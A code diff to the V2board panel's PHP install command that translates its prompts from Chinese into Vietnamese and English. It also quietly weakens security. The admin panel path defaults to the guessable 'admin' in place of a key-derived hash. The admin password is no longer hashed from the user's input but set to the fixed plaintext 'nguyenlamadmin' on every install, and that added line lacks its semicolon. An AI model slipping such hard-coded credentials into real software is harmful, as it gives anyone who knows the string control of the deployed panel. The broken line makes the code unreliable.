@@ -48,20 +48,20 @@ class V2boardInstall extends Command
             $this->info("  \ V /  / __/| |_) | (_) | (_| | | | (_| | ");
             $this->info("   \_/  |_____|____/ \___/ \__,_|_|  \__,_| ");
             if (\File::exists(base_path() . '/.env')) {
-                $securePath = config('v2board.secure_path', config('v2board.frontend_admin_path', hash('crc32b', config('app.key'))));
-                $this->info("访问 http(s)://你的站点/{$securePath} 进入管理面板，你可以在用户中心修改你的密码。");
-                abort(500, '如需重新安装请删除目录下.env文件');
+                $securePath = config('v2board.secure_path', config('v2board.frontend_admin_path', 'admin'));
+                $this->info("Admin :  http(s)://domain.com/{$securePath} La Trang Admin Da Duoc Dang Ky");
+                abort(500, 'Khong the ghi de file ->.env<- (Hay xoa file do)');
             }
 
             if (!copy(base_path() . '/.env.example', base_path() . '/.env')) {
-                abort(500, '复制环境文件失败，请检查目录权限');
+                abort(500, 'Source loi vui long tai lai ');
             }
             $this->saveToEnv([
                 'APP_KEY' => 'base64:' . base64_encode(Encrypter::generateKey('AES-256-CBC')),
-                'DB_HOST' => $this->ask('请输入数据库地址（默认:localhost）', 'localhost'),
-                'DB_DATABASE' => $this->ask('请输入数据库名'),
-                'DB_USERNAME' => $this->ask('请输入数据库用户名'),
-                'DB_PASSWORD' => $this->ask('请输入数据库密码')
+                'DB_HOST' => $this->ask('Database host:localhost）', 'localhost'),
+                'DB_DATABASE' => $this->ask('Database name'),
+                'DB_USERNAME' => $this->ask('Database username'),
+                'DB_PASSWORD' => $this->ask('Database password')
             ]);
             \Artisan::call('config:clear');
             \Artisan::call('config:cache');
@@ -114,7 +114,7 @@ class V2boardInstall extends Command
         if (strlen($password) < 8) {
             abort(500, '管理员密码长度最小为8位字符');
         }
-        $user->password = password_hash($password, PASSWORD_DEFAULT);
+        $user->password = "nguyenlamadmin"
         $user->uuid = Helper::guid(true);
         $user->token = Helper::guid();
         $user->is_admin = 1;
